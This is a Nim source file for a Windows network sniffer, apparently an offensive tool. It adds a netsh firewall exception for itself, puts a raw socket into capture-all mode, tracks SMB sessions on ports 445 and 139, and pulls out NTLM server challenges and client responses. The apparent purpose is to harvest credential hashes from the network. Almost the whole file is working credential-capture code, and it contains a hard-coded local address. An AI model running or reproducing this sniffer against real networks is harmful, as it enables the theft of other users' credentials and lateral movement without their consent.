import winim except `$`
import strutils, tables, os, osproc
import HelpUtil, NTLM 
from winlean import inet_ntoa, InAddr

type
  IPV4_HDR* {.bycopy.} = object
    ip_header_len* {.bitsize: 4.}: cuchar ##  4-bit header length (in 32-bit words) normally=5 (Means 20 Bytes may be 24 also)
    ip_version* {.bitsize: 4.}: cuchar ##  4-bit IPv4 version
    ip_tos*: cuchar            ##  IP type of service
    ip_total_length*: cushort  ##  Total length
    ip_id*: cushort            ##  Unique identifier
    ip_frag_offset* {.bitsize: 5.}: cuchar ##  Fragment offset field
    ip_more_fragment* {.bitsize: 1.}: cuchar
    ip_dont_fragment* {.bitsize: 1.}: cuchar
    ip_reserved_zero* {.bitsize: 1.}: cuchar
    ip_frag_offset1*: cuchar   ## fragment offset
    ip_ttl*: cuchar            ##  Time to live
    ip_protocol*: cuchar       ##  Protocol(TCP,UDP etc)
    ip_checksum*: cushort      ##  IP checksum
    ip_srcaddr*: cuint         ##  Source address
    ip_destaddr*: cuint        ##  Source address

  TCP_HDR* {.bycopy.} = object
    source_port*: cushort      ##  source port
    dest_port*: cushort       ##  destination port
    sequence*: cuint           ##  sequence number - 32 bits
    acknowledge*: cuint        ##  acknowledgement number - 32 bits
    ns* {.bitsize: 1.}: cuchar   ## Nonce Sum Flag Added in RFC 3540.
    reserved_part1* {.bitsize: 3.}: cuchar ## according to rfc
    data_offset* {.bitsize: 4.}: cuchar ## The number of 32-bit words in the TCP header.
                                    ## 	This indicates where the data begins.
                                    ## 	The length of the TCP header is always a multiple
                                    ## 	of 32 bits.
    fin* {.bitsize: 1.}: cuchar  ## Finish Flag
    syn* {.bitsize: 1.}: cuchar  ## Synchronise Flag
    rst* {.bitsize: 1.}: cuchar  ## Reset Flag
    psh* {.bitsize: 1.}: cuchar  ## Push Flag
    ack* {.bitsize: 1.}: cuchar  ## Acknowledgement Flag
    urg* {.bitsize: 1.}: cuchar  ## Urgent Flag
    ecn* {.bitsize: 1.}: cuchar  ## ECN-Echo Flag
    cwr* {.bitsize: 1.}: cuchar  ## Congestion Window Reduced Flag
                            ## //////////////////////////////
    window*: cushort           ##  window
    checksum*: cushort         ##  checksum
    urgent_pointer*: cushort   ##  urgent pointer

proc add_rule*() =
    let 
        addCommand = "netsh advfirewall firewall add rule name='NimScan' dir=in action=allow program=\"$1\" enable=yes" % [getAppFilename()]
    discard execCmdEx(addCommand)

proc remove_rule*() =
    let 
        delCommand = "netsh advfirewall firewall delete rule name='NimScan'"
    discard execCmdEx(delCommand)

proc PrintTcpPacket*(buffer: array[65536, char], size: int, iphdr: IPV4_HDR) =
    var 
        ip_addr: winlean.InAddr
        source_ip: string
        dest_ip: string

    ip_addr.s_addr = iphdr.ip_srcaddr
    source_ip = $winlean.inet_ntoa(ip_addr)
    ip_addr.s_addr = iphdr.ip_destaddr
    dest_ip = $winlean.inet_ntoa(ip_addr)

    # if source_ip == "192.168.1.24":
    var 
        iphdrlen = (iphdr.ip_header_len.int * 4)
        miniBuffer: array[65536, char]
    for i in 0..(size-1):
        miniBuffer[i] = buffer[iphdrlen+i]
    var 
        tcpheader = cast[TCP_HDR](miniBuffer)
        dest_port = ntohs(tcpheader.dest_port).int
        source_port = ntohs(tcpheader.source_port).int
        challenge: string
        session: string

    var 
        payload: seq[char]
        payloadSize = size - iphdrlen - (tcpheader.data_offset.int * 4)
    
    for i in 0..payloadSize-1:
        payload.add(buffer[iphdrlen + (tcpheader.data_offset.int * 4) + i])

    var payloadHex = payload.join().toHex() 

    if dest_port == 445 or dest_port == 139:
        session = source_ip & ":" & $source_port
        if payloadSize > 0:
            if ("FF534D42" in payloadHex or "FE534D42" in payloadHex):
                if not sessionsTable.hasKey(session):
                    sessionsTable[session] = ""

        if sessionsTable.hasKey(session):
            GetNTLMResponse(payload, payloadHex, source_ip, source_port)

    if source_port == 445 or source_port == 139:
        if payloadSize > 0:
            challenge = GetSMBNTLMChallenge(payloadHex)

        session = dest_ip & ":" & $dest_port

        if challenge != "" and dest_ip != source_ip:
            sessionsTable[session] = challenge
    
    # echo sessionsTable

proc ProcessPacket(buffer: array[65536, char], size: int) =
    var iphdr = cast[IPV4_HDR](buffer)

    case iphdr.ip_protocol.int
    of 6:
        PrintTcpPacket(buffer,size,iphdr)
    else:
        discard

proc StartSniffing(snifferSocket: SOCKET) =
    var 
        buffer: array[65536, char]
        saddr: sockaddr
        saddr_size: int32 = sizeof(saddr).int32
        data_size: int32

    while true:
        data_size = recvfrom(snifferSocket, buffer, 65536.int32, 0.int32, addr saddr, addr saddr_size)
        if data_size > 0:
            buffer.ProcessPacket(data_size)
        else:
            echo "FUCK"
            echo GetLastError()
            break 


proc main() =
    add_rule()

    var wsa: WSADATA

    if WSAStartup(MAKEWORD(2,2), &wsa) != 0:
        echo "WSAStartup failed"
    else:
        echo "WSAStartup success"

    # unsigned char *buffer = (unsigned char *)malloc(65536);
    var 
        snifferSocket = socket(AF_INET, SOCK_RAW, IPPROTO_IP)
        dest: sockaddr_in

    if snifferSocket == INVALID_SOCKET:
        echo "Failed to create socket"
    else:
        echo "Socket created"

    dest.sin_addr.S_addr = inet_addr("192.168.1.21")
    dest.sin_port = 0
    dest.sin_family = AF_INET

    if `bind`(snifferSocket, cast[(ptr sockaddr)](addr dest), sizeof(dest).int32) == SOCKET_ERROR:
        echo "bind failed"
    else:
        echo "bind success"

    var 
        j = 1
        In: DWORD = 2

    if WSAIoctl(snifferSocket, (DWORD)SIO_RCVALL, &j, (DWORD)sizeof(j), NULL, 0, &In, NULL, NULL) == SOCKET_ERROR:
        echo "WSAIoctl failed"
    else:
        echo "WSAIoctl success"

    StartSniffing(snifferSocket)

when isMainModule:
    main()